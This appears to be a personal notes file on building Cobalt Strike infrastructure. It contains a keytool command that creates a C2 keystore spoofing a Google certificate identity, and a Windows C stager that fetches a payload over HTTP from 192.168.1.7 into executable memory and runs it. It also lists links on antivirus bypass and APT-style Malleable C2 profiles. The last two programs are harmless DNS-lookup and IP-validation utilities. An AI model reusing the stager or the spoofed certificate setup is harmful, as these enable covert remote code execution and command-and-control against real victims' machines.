keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias Google.com -dname "CN=Google, OU=Google IT, O=Google Corporation, L=Mountain View, S=Santa Clara, C=US"


#include<Windows.h>
#include<wininet.h>
#pragma comment (lib, "wininet.lib")
int main() {
	HINTERNET Session = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	HINTERNET con = InternetConnectA(Session, "192.168.1.7", 80, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
	HINTERNET Http = HttpOpenRequestA(con, "GET", "/index.html", "HTTP/1.1", NULL, NULL, INTERNET_FLAG_NO_CACHE_WRITE, NULL);
	HttpSendRequest(Http, NULL, NULL, NULL, NULL);
	LPVOID a = VirtualAlloc(NULL, 0x400000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	DWORD dwRealWord;

	for (int i = 0; i < 32; i++) {
		BOOL response = InternetReadFile(Http, (LPVOID)((int)a + i * 0x2000), 0x2000, &dwRealWord);
	}
	((void(*)())a)();
	return 0;
}

https://www.macchiato.ink/hst/bypassav/imitation_cs/
https://paper.seebug.org/1349/
https://github.com/rsmudge/Malleable-C2-Profiles/tree/master/APT
https://blog.csdn.net/weixin_39525355/article/details/111263172
https://blog.csdn.net/m0_50526465/article/details/116465013


#include <stdio.h>
#include <assert.h>
#include <WS2tcpip.h>
#include <WinSock2.h>

#pragma comment(lib, "Ws2_32.lib")

const char* domain = "www.baidu.com";

int main()
{
	int n_error = 0;
	WSADATA wsadata;
	n_error = WSAStartup(MAKEWORD(2, 2), &wsadata);
	//assert(n_error != 0);

	in_addr remote_addr;
	hostent* hptr = NULL;
	char** pptr;
	char str[MAX_PATH];

	if ((hptr = (hostent*)gethostbyname(domain)) == NULL) {
		int n_err = WSAGetLastError();
		return 0;
	}

	if (hptr->h_addrtype == AF_INET) {
		pptr = hptr->h_addr_list;
		for (; *pptr != NULL; pptr++) {
			printf("%s\n", inet_ntop(hptr->h_addrtype, *pptr, str, sizeof(str)));
		}
	}

	return 0;
}

////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <string.h>
#include <WinSock2.h>
#include <Windows.h>
#pragma comment(lib,"ws2_32.lib")
/*
* 	地址为IP返回true 其他返回false
*/
BOOL server_is_ip(char* server)
{
    char ip[4][4] = { 0 };
    int  ip_i = 0;
    char* ptr = server;
    int  ptr_i = 0;
    int  ptr_len = strlen(server);

    if (NULL == server || 15 < ptr_len) {
        return FALSE;
    }

    //检查IP范围
    for (int i = 0; i < 4; i++)
    {
        ip_i = 0;
        for (int j = 0; j < 4; j++)
        {
            //1.字符为0-9的数字
            if (3 != j && isdigit(ptr[ptr_i]))
            {
                ip[i][ip_i++] = ptr[ptr_i++];
            }
            //2.字符为'.'分隔符
            else if (3 != i && 0 != j && '.' == ptr[ptr_i])
            {
                ip[i][ip_i++] = '\0';
                ptr_i++;
                break;
            }
            else
            {
                return FALSE;
            }
            //3.结束
            if (ptr_len <= ptr_i)
            {
                if (3 == i)
                    break;
                else
                    return FALSE;
            }
        }
    }
    //检查IP格式
    for (int z = 0; z < 4; z++)
        if (atoi(ip[z]) > 255) {
            return FALSE;
        }
    return TRUE;
}

BOOL ip_or_hostname(char* name) {
    unsigned long  add = inet_addr(name);
    if (add == INADDR_NONE)
    {
        return FALSE;
        printf("no ip，is域名");
    }
    else {
        return TRUE;
        printf("no 域名，is ip");
    }

    
}


int main(void)
{
    ip_or_hostname(NULL);
    char* servers[] = {
        (char*)"58.83.160.156",
        (char*)"91.185.0.88",
        (char*)"ff.185.0.88",
        (char*)"xx.185.0.88",
        (char*)"91.185.0.88.",
        (char*)"www.google.com",
        (char*)"www.goog.com",
        (char*)"91.185.0.258",
        (char*)"255.255.255.255",
        (char*)"91.185.0.",
        (char*)".185.0.88",
        (char*)"0.0.0.0",
        (char*)"1.1.1.1",
        (char*)"www.bing.com",
        NULL
    };

    for (int i = 0;; i++)
    {
        if (servers[i] == NULL)
            return 0;
        printf("%s is %s\r\n", servers[i], server_is_ip(servers[i]) ? "IP" : "DNS");
    }

    return 0;
}


